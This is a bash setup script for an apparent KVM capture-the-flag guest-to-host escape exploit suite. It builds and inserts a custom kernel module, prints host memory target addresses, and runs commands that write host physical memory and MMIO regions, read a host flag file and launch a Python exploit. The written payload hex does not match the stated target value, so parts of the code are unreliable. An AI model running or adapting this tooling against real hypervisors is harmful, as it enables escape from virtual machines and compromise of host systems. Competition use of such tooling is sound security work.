#!/bin/bash
# KVM CTF Exploit Suite - FINAL Setup Script
# Updated for correct GPA/HPA handling

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

print_banner() {
    echo -e "${BLUE}"
    echo "╔═══════════════════════════════════════════════════════╗"
    echo "║     KVM CTF Guest-to-Host Escape Exploit Suite       ║"
    echo "║           FINAL - Proper Address Handling            ║"
    echo "╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

print_info() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_error() {
    echo -e "${RED}[✗]${NC} $1"
}

print_critical() {
    echo -e "${CYAN}[!]${NC} ${CYAN}$1${NC}"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "This script must be run as root (in guest VM)"
        exit 1
    fi
}

check_dependencies() {
    print_info "Checking dependencies..."
    
    local missing_deps=()
    
    if ! command -v gcc &> /dev/null; then
        missing_deps+=("gcc")
    fi
    
    if ! command -v make &> /dev/null; then
        missing_deps+=("make")
    fi
    
    if ! command -v python3 &> /dev/null; then
        missing_deps+=("python3")
    fi
    
    if [ ! -d "/lib/modules/$(uname -r)/build" ]; then
        print_warning "Kernel headers not found for $(uname -r)"
        missing_deps+=("linux-headers-$(uname -r)")
    fi
    
    if [ ${#missing_deps[@]} -ne 0 ]; then
        print_error "Missing dependencies: ${missing_deps[*]}"
        print_info "Install with: apt-get install ${missing_deps[*]}"
        exit 1
    fi
    
    print_success "All dependencies found"
}

build_module() {
    print_info "Building FINAL kernel module (with GPA/HPA support)..."
    make clean &> /dev/null || true
    
    if ! make module 2>&1 | tee /tmp/build.log; then
        print_error "Build failed. Check /tmp/build.log"
        exit 1
    fi
    
    if [ -f "kvm_probe_drv.ko" ]; then
        print_success "Kernel module built successfully"
        print_info "Module features: GPA (guest), HPA (host), MMIO (hardware)"
    else
        print_error "Failed to build kernel module"
        exit 1
    fi
}

build_userspace() {
    print_info "Building FINAL userspace tools..."
    
    if ! make userspace 2>&1 | tee -a /tmp/build.log; then
        print_error "Build failed. Check /tmp/build.log"
        exit 1
    fi
    
    if [ -f "kvm_prober" ]; then
        print_success "kvm_prober built (with readhpa/writehpa commands)"
    else
        print_error "Failed to build kvm_prober"
        exit 1
    fi
}

load_module() {
    print_info "Loading kernel module..."
    
    rmmod kvm_probe_drv 2>/dev/null || true
    
    if ! insmod kvm_probe_drv.ko; then
        print_error "Failed to load module"
        dmesg | tail -10
        exit 1
    fi
    
    sleep 1
    
    if [ -e "/dev/kvm_probe_dev" ] || [ -e "/dev/kvm_probe_drv" ]; then
        print_success "Module loaded, device created"
        ls -la /dev/kvm_probe* 2>/dev/null
    else
        print_error "Module loaded but device not found"
        dmesg | tail -5
        exit 1
    fi
}

install_tools() {
    print_info "Installing tools..."
    
    cp kvm_prober /usr/local/bin/
    chmod +x /usr/local/bin/kvm_prober
    
    # Make Python exploit executable
    if [ -f "ultimate_kvm_exploit.py" ]; then
        chmod +x ultimate_kvm_exploit.py
        print_success "ultimate_kvm_exploit.py ready"
    else
        print_warning "ultimate_kvm_exploit.py not found"
    fi
    
    print_success "Tools installed to /usr/local/bin/"
}

show_address_warning() {
    echo ""
    print_critical "═══════════════════════════════════════════════════════"
    print_critical "CRITICAL: Understanding Address Spaces"
    print_critical "═══════════════════════════════════════════════════════"
    echo ""
    echo -e "${CYAN}Guest Physical (GPA) ≠ Host Physical (HPA)${NC}"
    echo ""
    echo "  Guest Address Space          Host Address Space"
    echo "  ───────────────────          ──────────────────"
    echo "  GPA 0x64279a8                HPA 0x64279a8 ← FLAG HERE!"
    echo "  (guest's RAM)                (actual host RAM)"
    echo ""
    echo -e "${CYAN}To access HOST memory from guest:${NC}"
    echo "  ✓ Use MMIO (via IVSHMEM BARs)"
    echo "  ✓ Use HPA IOCTLs (readhpa/writehpa)"
    echo "  ✗ DON'T use GPA - that's guest memory only!"
    echo ""
    print_critical "═══════════════════════════════════════════════════════"
    echo ""
}

show_pci_info() {
    print_info "Scanning for PCI devices and IVSHMEM..."
    echo ""
    
    echo -e "${BLUE}PCI Devices:${NC}"
    lspci | head -10
    echo ""
    
    echo -e "${BLUE}IVSHMEM Devices (vendor 1af4 - Red Hat/QEMU):${NC}"
    if lspci -d 1af4: 2>/dev/null | grep -q .; then
        lspci -d 1af4: -v
        print_success "IVSHMEM devices found! Exploitation likely possible"
    else
        print_warning "No IVSHMEM devices found (vendor 1af4)"
        print_info "Checking for other virtio devices..."
        if lspci | grep -i virtio | grep -q .; then
            lspci | grep -i virtio
            print_warning "Found virtio devices - may still be exploitable"
        else
            print_error "No virtio/IVSHMEM devices - exploitation difficult"
        fi
    fi
    echo ""
    
    echo -e "${BLUE}BAR Information (first 3 devices with BARs):${NC}"
    count=0
    for dev in /sys/bus/pci/devices/*/resource; do
        if [ $count -ge 3 ]; then break; fi
        bdf=$(basename $(dirname $dev))
        
        # Check if device has any non-zero BARs
        if grep -qv "0x0000000000000000" "$dev" 2>/dev/null; then
            echo "Device: $bdf"
            head -3 "$dev" 2>/dev/null | while IFS= read -r line; do
                if [ -n "$line" ]; then
                    parts=($line)
                    start=${parts[0]}
                    end=${parts[1]}
                    flags=${parts[2]}
                    if [ "$start" != "0x0000000000000000" ]; then
                        size=$((16#${end} - 16#${start} + 1))
                        is_io=$((16#${flags} & 0x1))
                        is_prefetch=$((16#${flags} & 0x8))
                        
                        if [ $is_io -eq 1 ]; then
                            type="I/O"
                        else
                            type="MMIO"
                        fi
                        
                        if [ $is_prefetch -ne 0 ] && [ $size -ge 1048576 ]; then
                            type="$type (PREFETCH - likely IVSHMEM!)"
                        fi
                        
                        echo "  $start - $end ($type, size: 0x$(printf '%x' $size))"
                    fi
                fi
            done
            count=$((count + 1))
            echo ""
        fi
    done
}

show_targets() {
    echo ""
    print_info "CTF Target Information (HOST addresses):"
    echo ""
    echo -e "${BLUE}Target 1: Memory Write Flag (250k points)${NC}"
    echo "  HOST Physical: 0x64279a8"
    echo "  HOST Virtual:  0xffffffff826279a8"
    echo "  Required Value: 0xdeadbeef41424344"
    echo ""
    echo -e "${BLUE}Target 2: Memory Read Flag (50-100k points)${NC}"
    echo "  HOST Physical: 0x695ee10"
    echo "  HOST Virtual:  0xffffffff82b5ee10"
    echo "  Action: Read flag content"
    echo ""
    echo -e "${BLUE}Target 3: RCE Flag (250k points)${NC}"
    echo "  File Path: /root/rce_flag (on HOST)"
    echo "  Action: Read host file from guest"
    echo ""
}

run_basic_tests() {
    print_info "Running basic functionality tests..."
    echo ""
    
    echo -e "${BLUE}Test 1: Device Access${NC}"
    if kvm_prober getkaslr &>/dev/null; then
        print_success "KASLR detection works"
    else
        print_warning "KASLR detection failed (may be expected)"
    fi
    
    echo -e "${BLUE}Test 2: GPA Operations (Guest Memory)${NC}"
    if kvm_prober writegpa 1000000 deadbeefcafebabe &>/dev/null; then
        print_success "GPA write works (writes to GUEST memory)"
        if kvm_prober readgpa 1000000 8 &>/dev/null; then
            print_success "GPA read works (reads GUEST memory)"
        fi
    else
        print_warning "GPA operations failed"
    fi
    
    echo -e "${BLUE}Test 3: HPA Operations (Host Memory Access)${NC}"
    if kvm_prober writehpa 64279a8 4443424241efbeadde 2>&1 | grep -q "ioremap failed"; then
        print_warning "HPA direct access failed (expected - need IVSHMEM)"
        print_info "This is normal - ioremap can't map arbitrary host RAM"
    elif kvm_prober writehpa 64279a8 4443424241efbeadde &>/dev/null; then
        print_success "HPA write works! (unusual but good)"
    fi
    
    echo -e "${BLUE}Test 4: File Read (RCE)${NC}"
    if kvm_prober readfile /etc/hostname 0 50 &>/dev/null; then
        print_success "File read capability works!"
    else
        print_warning "File read failed"
    fi
    
    echo ""
}

show_exploitation_guide() {
    echo ""
    print_info "Exploitation Strategy:"
    echo ""
    echo -e "${CYAN}Step 1: Find IVSHMEM BAR${NC}"
    echo "  lspci -d 1af4:"
    echo "  cat /sys/bus/pci/devices/0000:XX:XX.X/resource"
    echo ""
    echo -e "${CYAN}Step 2: Calculate Target Address${NC}"
    echo "  If BAR at 0xfe800000, try:"
    echo "  - kvm_prober writemmio_buf <bar+0x64279a8> 4443424241efbeadde"
    echo "  - kvm_prober writemmio_buf <bar+0x4279a8>  4443424241efbeadde"
    echo ""
    echo -e "${CYAN}Step 3: Or Use Ultimate Exploit (Recommended)${NC}"
    echo "  sudo python3 ultimate_kvm_exploit.py"
    echo ""
}

run_exploit() {
    local exploit_type=$1
    
    case $exploit_type in
        "ultimate")
            print_info "Running ULTIMATE exploit (RECOMMENDED)..."
            if [ -f "ultimate_kvm_exploit.py" ]; then
                python3 ultimate_kvm_exploit.py
            else
                print_error "ultimate_kvm_exploit.py not found!"
                exit 1
            fi
            ;;
        "manual")
            print_info "Manual exploitation mode..."
            print_info "Try these commands:"
            echo ""
            echo "# Find IVSHMEM:"
            echo "lspci -d 1af4:"
            echo ""
            echo "# Try different methods:"
            echo "kvm_prober writehpa 64279a8 4443424241efbeadde"
            echo "kvm_prober writemmio_buf <bar_addr> 4443424241efbeadde"
            echo "kvm_prober readfile /root/rce_flag 0 256"
            ;;
        *)
            print_error "Unknown exploit type: $exploit_type"
            print_info "Available: ultimate, manual"
            exit 1
            ;;
    esac
}

show_usage() {
    echo "Usage: $0 [command]"
    echo ""
    echo "Commands:"
    echo "  install        - Build and install everything"
    echo "  build          - Only build (no install)"
    echo "  load           - Only load module"
    echo "  test           - Run basic tests"
    echo "  info           - Show PCI/IVSHMEM information"
    echo "  guide          - Show exploitation guide"
    echo "  exploit [type] - Run exploit (ultimate|manual)"
    echo "  uninstall      - Remove module and tools"
    echo "  clean          - Clean build artifacts"
    echo "  help           - Show this help"
    echo ""
    echo "Quick Start:"
    echo "  sudo ./setup.sh install          # Install everything"
    echo "  sudo ./setup.sh info              # Check for IVSHMEM"
    echo "  sudo ./setup.sh exploit ultimate  # Run ultimate exploit"
    echo ""
    echo "Files:"
    echo "  ✓ kvm_probe_drv.c  - FINAL driver (GPA/HPA/MMIO)"
    echo "  ✓ kvm_prober.c     - FINAL tool (readhpa/writehpa)"
    echo "  ✓ ultimate_kvm_exploit.py - FINAL exploit (8 methods)"
}

main() {
    print_banner
    
    case "${1:-install}" in
        "install")
            check_root
            check_dependencies
            build_module
            build_userspace
            load_module
            install_tools
            show_address_warning
            show_pci_info
            show_targets
            run_basic_tests
            show_exploitation_guide
            print_success "Installation complete!"
            echo ""
            print_info "Next steps:"
            echo "  1. Review address space info above"
            echo "  2. Run: sudo ./setup.sh info"
            echo "  3. Run: sudo ./setup.sh exploit ultimate"
            ;;
        
        "build")
            check_dependencies
            build_module
            build_userspace
            print_success "Build complete!"
            ;;
        
        "load")
            check_root
            load_module
            ;;
        
        "test")
            check_root
            run_basic_tests
            ;;
        
        "info")
            show_address_warning
            show_pci_info
            show_targets
            ;;
        
        "guide")
            show_exploitation_guide
            ;;
        
        "exploit")
            check_root
            run_exploit "${2:-ultimate}"
            ;;
        
        "uninstall")
            check_root
            print_info "Uninstalling..."
            rmmod kvm_probe_drv 2>/dev/null || true
            rm -f /usr/local/bin/kvm_prober
            rm -f /usr/local/bin/kvm_direct_exploit
            print_success "Uninstall complete!"
            ;;
        
        "clean")
            print_info "Cleaning..."
            make clean &>/dev/null || true
            print_success "Clean complete!"
            ;;
        
        "help")
            show_usage
            ;;
        
        *)
            print_error "Unknown command: $1"
            show_usage
            exit 1
            ;;
    esac
}

main "$@"